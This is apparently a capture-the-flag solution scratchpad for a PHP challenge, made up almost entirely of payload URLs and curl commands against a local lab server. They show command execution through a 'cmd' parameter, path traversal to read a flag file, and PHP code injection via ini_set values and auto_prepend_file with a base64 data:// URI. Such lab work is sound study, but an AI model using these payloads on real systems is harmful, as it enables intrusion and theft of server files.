# love-card

Make your own love card for your gf <3

## Solution

http://0.0.0.0:9137

http://0.0.0.0:9137/?name=hello

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp

http://0.0.0.0:9137/?name=hello%0Aworld

http://0.0.0.0:9137/?name=hello%0Aworld&cmd=ls&dev=true

http://0.0.0.0:9137/?name=hello%0Aworld&cmd=ls%20..%2F..%2F..%2F..%2F..%2F..%2F/&dev=true

http://0.0.0.0:9137/?name=hello%0Aworld&cmd=ls%20..%2F..%2F..%2F..%2F..%2F..%2F/&dev=true

http://0.0.0.0:9137/?name=hello%0Aworld&cmd=cat%20..%2F..%2F..%2F..%2F..%2F..%2F/flag_0mny51tj.txt&dev=true



http://0.0.0.0:9137/?name=hello%0Aworld&display_errors=1

http://0.0.0.0:9137/?display_errors=1&name=hello&doc_root=%2F

http://0.0.0.0:9137/?display_errors=1&name=hello&open_basedir=/


```sh
curl --header "X-Forwarded-For: 127.0.0.1" http://0.0.0.0:9137/?name=hello%0Aworld&cmd=ls&dev=true

curl http://0.0.0.0:9137/?name=hello%0Aworld&cmd=ls&dev=true -A "<?php system('ls /'); ?>"
```

Oh wait

```php
<?php system('ls /');?>
// %3C%3Fphp%20system%28%27ls%20%2F%27%29%3B%3F%3E
// PD9waHAgc3lzdGVtKCdscyAvJyk7Pz4=
```

http://0.0.0.0:9137/?name=hello%0Aworld%0A%3C%3Fphp%20system%28%27ls%20%2F%27%29%3B%3F%3E&display_errors=1

http://0.0.0.0:9137/?name=hello%0Aworld%0A%3C%3Fphp%20system%28%27ls%20%2F%27%29%3B%3F%3E&display_errors=1&error_reporting=1
 
http://0.0.0.0:9137/?name=hello%0Aworld%0A%3C%3Fphp%20system%28%27ls%20%2F%27%29%3B%3F%3E%5C0&display_errors=1

http://0.0.0.0:9137/?display_errors=1&name=hello%0A%3C%3Fphp%20system%28%27ls%20%2F%27%29%3B%3F%3E%5C0

https://bugs.php.net/bug.php?id=69274

http://0.0.0.0:9137/?display_errors=1&name[]=hello%0A%3C%3Fphp%20system%28%27ls%20%2F%27%29%3B%3F%3E%5C0

http://0.0.0.0:9137/?display_errors=1&%3C%3Fphp%20system%28%27ls%20%2F%27%29%3B%3F%3E%5C0[]=hello
 Fatal error: Uncaught TypeError: ini_set(): Argument #2 ($value) must be of type string|int|float|bool|null in /var/www/html/index.php:6 Stack trace: #0 /var/www/html/index.php(6): ini_set('<?php_system('l...', Array) #1 {main} thrown in /var/www/html/index.php on line 6

http://0.0.0.0:9137/?display_errors=1&name=hello%0A%3C%3Fphp%20system%28%27ls%20%2F%27%29%3B%3F%3E%5C0

```sh
curl "http://0.0.0.0:9137/?display_errors=1&allow_url_include=1&name=hello&auto_prepend_file="data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAvJyk7Pz4="'
```

http://0.0.0.0:9137/?display_errors=1&allow_url_include=1&name=hello&auto_prepend_file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAvJyk7Pz4=
http://0.0.0.0:9137/?display_errors=1&allow_url_fopen=1&auto_prepend_file=php://%3C%3Fphp%20system%28%27ls%20%2F%27%29%3B%3F%3E&name=hello;

http://0.0.0.0:9137/?display_errors=1&allow_url_fopen=1&name=php://%3C%3Fphp%20system%28%27ls%20%2F%27%29%3B%3F%3E

http://0.0.0.0:9137/?display_errors=1&allow_url_fopen=1&name=data://PD9waHAgc3lzdGVtKCdscyAvJyk7Pz4=

http://0.0.0.0:9137/?display_errors=1&allow_url_fopen=1&name=php://PD9waHAgc3lzdGVtKCdscyAvJyk7Pz4=

http://0.0.0.0:9137/?display_errors=1&allow_url_fopen=1&name=data://text;base64,PD9waHAgc3lzdGVtKCdscyAvJyk7Pz4=

http://0.0.0.0:9137/?display_errors=1&name$=$

http://0.0.0.0:9137/?display_errors=1&name=\120

http://0.0.0.0:9137/?display_errors=1&name=hello%0A
<?php system('ls /');?>

http://0.0.0.0:9137/?display_errors=1&name=hello%0Aworld;
http://0.0.0.0:9137/?display_errors=1&name=hello%0A%0A%0A%0A%0A%0A%0A%0Aworld;


http://0.0.0.0:9137/?display_errors=1&name=hello%0A%0Aworld